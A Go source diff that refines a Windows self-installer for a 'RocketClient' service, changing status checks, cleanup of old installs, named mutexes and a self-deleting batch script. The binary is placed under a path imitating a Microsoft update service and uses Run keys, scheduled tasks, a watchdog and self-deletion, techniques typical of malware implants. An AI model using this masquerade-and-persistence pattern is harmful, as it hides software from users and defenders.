@@ -18,7 +18,10 @@ import (
 // WindowsInstaller handles self-installation on Windows
 type WindowsInstaller struct{}
 
-const installMutexName = `Global\RocketClientInstallMutex`
+const (
+	installMutexName = `Global\RocketClientInstallMutex`
+	updateMutexName  = `Global\RocketClientUpdateMutex`
+)
 
 // NewInstaller creates a new Windows installer
 func NewInstaller() *WindowsInstaller {
@@ -34,7 +37,9 @@ func (w *WindowsInstaller) GetInstallPath() string {
 	return filepath.Join(programData, "Microsoft", "Update", "UpdateService.exe")
 }
 
-// IsInstalled checks if the service is already installed
+// IsInstalled checks if the service is already installed.
+// Note: This function no longer deletes the binary on status check failure
+// to avoid destructive side effects during simple status checks.
 func (w *WindowsInstaller) IsInstalled() bool {
 	installPath := w.GetInstallPath()
 	golog.Infof("installer: checking if installed at %s", installPath)
@@ -48,17 +53,17 @@ func (w *WindowsInstaller) IsInstalled() bool {
 	ctrl := NewServiceController(installPath)
 	status, err := ctrl.Status()
 	if err != nil {
-		golog.Warnf("installer: service status check failed: %v", err)
-		golog.Warn("installer: cleaning up stale binary")
-		_ = os.Remove(installPath)
-		return false
+		// Don't delete the binary on status check failure - this could be a transient SCM issue
+		golog.Warnf("installer: service status check failed: %v (binary exists, treating as installed for update)", err)
+		// Return true to allow update path to handle cleanup properly
+		return true
 	}
 
 	golog.Infof("installer: service status: %s", status)
 	if status == "unknown" {
-		golog.Warn("installer: service status unknown, cleaning up stale binary")
-		_ = os.Remove(installPath)
-		return false
+		// Service not registered but binary exists - allow update path to reinstall service
+		golog.Warn("installer: service status unknown, binary exists - treating as installed for update")
+		return true
 	}
 
 	golog.Info("installer: service is installed and registered")
@@ -108,6 +113,10 @@ func (w *WindowsInstaller) Install() error {
 		return err
 	}
 
+	// 3a. Copy support DLLs bundled alongside the installer into the install directory
+	golog.Info("installer: deploying support DLLs")
+	CopySupportDLLs(filepath.Dir(selfPath), installDir)
+
 	// 4. Create service controller for installed path
 	svcCtrl := NewServiceController(installPath)
 
@@ -145,40 +154,104 @@ func setRunKey(path string) {
 	setRunKeyRoots(path)
 }
 
+// CleanupResult tracks what was cleaned during cleanOldInstall
+type CleanupResult struct {
+	PersistenceDisabled bool
+	ServiceStopped      bool
+	ServiceUninstalled  bool
+	ProcessesKilled     bool
+	TasksRemoved        bool
+	Errors              []error
+}
+
 // cleanOldInstall disables persistence/watchdog, stops the service, and cleans scheduled tasks/run keys
 // so a new install can take over cleanly even if an old binary is running.
-func (w *WindowsInstaller) cleanOldInstall() {
+// Returns a CleanupResult for tracking what operations succeeded.
+func (w *WindowsInstaller) cleanOldInstall() *CleanupResult {
+	result := &CleanupResult{}
 	installPath := w.GetInstallPath()
 	binaryName := filepath.Base(installPath)
 
 	golog.Info("installer: pre-cleaning existing install (disable persistence, stop service, remove tasks/run keys)")
 
-	// Disable persistence/watchdog flags so Stop will take effect.
+	// Step 1: Disable persistence/watchdog flags so Stop will take effect.
 	DisablePersistence(installPath)
+	result.PersistenceDisabled = true
+	golog.Info("installer: persistence disabled")
 
-	// Best-effort stop via SCM.
+	// Step 2: Stop the service via SCM
 	ctrl := NewServiceController(installPath)
 	if err := ctrl.Stop(); err != nil {
 		golog.Warnf("installer: service stop returned error (may be okay): %v", err)
+		result.Errors = append(result.Errors, fmt.Errorf("service stop: %w", err))
+	} else {
+		golog.Info("installer: service stop command sent")
 	}
 
-	// Wait briefly for service to report stopped
-	waitForServiceState(ctrl, "stopped", 10*time.Second)
+	// Step 3: Wait for service to actually stop with detailed logging
+	golog.Info("installer: waiting for service to stop...")
+	stopped := waitForServiceStateWithResult(ctrl, "stopped", 15*time.Second)
+	result.ServiceStopped = stopped
+	if stopped {
+		golog.Info("installer: service confirmed stopped")
+	} else {
+		golog.Warn("installer: service stop timeout, proceeding anyway")
+	}
 
-	// Kill stray processes by name (covers UI helpers launched in user sessions).
-	_ = exec.Command("taskkill", "/F", "/IM", binaryName, "/T").Run()
+	// Step 4: Kill stray processes by name (covers UI helpers launched in user sessions).
+	// Use specific process matching to avoid killing unrelated processes
+	golog.Infof("installer: killing stray processes matching %s", binaryName)
+	killCmd := exec.Command("taskkill", "/F", "/IM", binaryName, "/T")
+	if killErr := killCmd.Run(); killErr != nil {
+		// taskkill returns error if no processes found - this is okay
+		golog.Debugf("installer: taskkill result (may be okay if no processes): %v", killErr)
+	} else {
+		result.ProcessesKilled = true
+		golog.Info("installer: stray processes killed")
+	}
 
-	// Remove scheduled task + Run keys to prevent immediate respawn.
+	// Step 5: Remove scheduled task + Run keys to prevent immediate respawn.
+	golog.Info("installer: removing scheduled task and Run keys")
 	clearRunKeyRoots()
 	removeScheduledTask()
+	result.TasksRemoved = true
 
-	// Best-effort uninstall of existing service registration (in case of stale/broken entries).
+	// Step 6: Uninstall existing service registration (in case of stale/broken entries).
+	golog.Info("installer: uninstalling service registration")
 	if err := ctrl.Uninstall(); err != nil {
-		golog.Warnf("installer: service uninstall returned error (may be okay): %v", err)
+		errStr := err.Error()
+		// "specified service does not exist" is expected if service wasn't installed
+		if strings.Contains(errStr, "does not exist") || strings.Contains(errStr, "not exist") {
+			golog.Info("installer: service was not registered (okay)")
+		} else {
+			golog.Warnf("installer: service uninstall returned error: %v", err)
+			result.Errors = append(result.Errors, fmt.Errorf("service uninstall: %w", err))
+		}
+	} else {
+		result.ServiceUninstalled = true
+		golog.Info("installer: service registration removed")
 	}
 
-	// Brief pause to allow SCM/process teardown.
+	// Step 7: Brief pause to allow SCM/process teardown.
+	golog.Info("installer: waiting for system to settle")
 	time.Sleep(2 * time.Second)
+
+	golog.Infof("installer: cleanup complete (stopped=%v, uninstalled=%v, errors=%d)",
+		result.ServiceStopped, result.ServiceUninstalled, len(result.Errors))
+	return result
+}
+
+// waitForServiceStateWithResult polls the service controller and returns whether the desired state was reached.
+func waitForServiceStateWithResult(ctrl ServiceController, desired string, timeout time.Duration) bool {
+	deadline := time.Now().Add(timeout)
+	for time.Now().Before(deadline) {
+		status, err := ctrl.Status()
+		if err == nil && strings.EqualFold(status, desired) {
+			return true
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	return false
 }
 
 // waitForServiceState polls the service controller until the desired state or timeout.
@@ -195,27 +268,40 @@ func waitForServiceState(ctrl ServiceController, desired string, timeout time.Du
 
 // acquireInstallMutex obtains a cross-process mutex to avoid concurrent installs/updates.
 func acquireInstallMutex(timeout time.Duration) (func(), error) {
-	name, _ := windows.UTF16PtrFromString(installMutexName)
+	return acquireNamedMutex(installMutexName, timeout)
+}
+
+// acquireUpdateMutex obtains a cross-process mutex specifically for updates.
+func acquireUpdateMutex(timeout time.Duration) (func(), error) {
+	return acquireNamedMutex(updateMutexName, timeout)
+}
+
+// acquireNamedMutex obtains a cross-process mutex with the given name.
+func acquireNamedMutex(mutexName string, timeout time.Duration) (func(), error) {
+	name, _ := windows.UTF16PtrFromString(mutexName)
 	h, err := windows.CreateMutex(nil, false, name)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("CreateMutex failed: %w", err)
 	}
 	wait, err := windows.WaitForSingleObject(h, uint32(timeout.Milliseconds()))
 	if err != nil {
 		// WAIT_TIMEOUT is returned as an error in newer Go versions
 		if err == windows.WAIT_TIMEOUT {
 			windows.CloseHandle(h)
-			return nil, errors.New("install mutex wait timed out")
+			return nil, fmt.Errorf("mutex wait timed out after %v", timeout)
 		}
 		windows.CloseHandle(h)
-		return nil, err
+		return nil, fmt.Errorf("WaitForSingleObject failed: %w", err)
 	}
 	switch wait {
 	case uint32(windows.WAIT_OBJECT_0), uint32(windows.WAIT_ABANDONED):
-		// Acquired
+		// Acquired (WAIT_ABANDONED means previous owner crashed - we still own it)
+		if wait == uint32(windows.WAIT_ABANDONED) {
+			golog.Warn("installer: acquired abandoned mutex (previous process may have crashed)")
+		}
 	default:
 		windows.CloseHandle(h)
-		return nil, fmt.Errorf("install mutex wait failed: %x", wait)
+		return nil, fmt.Errorf("mutex wait returned unexpected status: %x", wait)
 	}
 	return func() {
 		_ = windows.ReleaseMutex(h)
@@ -223,23 +309,50 @@ func acquireInstallMutex(timeout time.Duration) (func(), error) {
 	}, nil
 }
 
+// scheduleSelfDelete schedules deletion of the specified file after a brief delay.
+// Uses a unique batch file name to avoid conflicts with concurrent operations.
 func scheduleSelfDelete(path string) {
 	if path == "" {
 		return
 	}
+
+	// Generate unique batch file name using timestamp and random suffix
+	timestamp := time.Now().UnixNano()
+	batchName := fmt.Sprintf("svc_cleanup_%d.bat", timestamp)
+	batch := filepath.Join(os.TempDir(), batchName)
+
+	// Escape path for batch file (handle special characters)
+	escapedPath := strings.ReplaceAll(path, "^", "^^")
+	escapedPath = strings.ReplaceAll(escapedPath, "&", "^&")
+	escapedPath = strings.ReplaceAll(escapedPath, "|", "^|")
+	escapedPath = strings.ReplaceAll(escapedPath, "<", "^<")
+	escapedPath = strings.ReplaceAll(escapedPath, ">", "^>")
+
+	// Use timeout command instead of ping for more reliable delay
+	// Wait 5 seconds, then delete the file and self-delete the batch
+	contents := "@echo off\r\n" +
+		"timeout /t 5 /nobreak >nul 2>&1\r\n" +
+		"del /f /q \"" + escapedPath + "\" >nul 2>&1\r\n" +
+		"del /f /q \"%~f0\" >nul 2>&1\r\n"
+
 	for i := 0; i < 3; i++ {
-		batch := filepath.Join(os.TempDir(), "svc_cleanup.bat")
-		contents := "@echo off\r\n" +
-			"ping 127.0.0.1 -n 3 >nul\r\n" +
-			"del /f /q \"" + path + "\"\r\n" +
-			"del /f /q \"%~f0\"\r\n"
 		if err := os.WriteFile(batch, []byte(contents), 0600); err != nil {
+			golog.Warnf("installer: failed to write cleanup batch (attempt %d): %v", i+1, err)
 			continue
 		}
-		if exec.Command("cmd.exe", "/C", batch).Start() == nil {
-			break
+
+		// Start the batch file detached
+		cmd := exec.Command("cmd.exe", "/C", "start", "/b", "", batch)
+		if err := cmd.Start(); err != nil {
+			golog.Warnf("installer: failed to start cleanup batch (attempt %d): %v", i+1, err)
+			continue
 		}
+
+		golog.Infof("installer: scheduled self-delete for %s", path)
+		return
 	}
+
+	golog.Warn("installer: failed to schedule self-delete after 3 attempts")
 }
 
 // Remove deletes the installed binary and clears the Run key entry (best-effort).
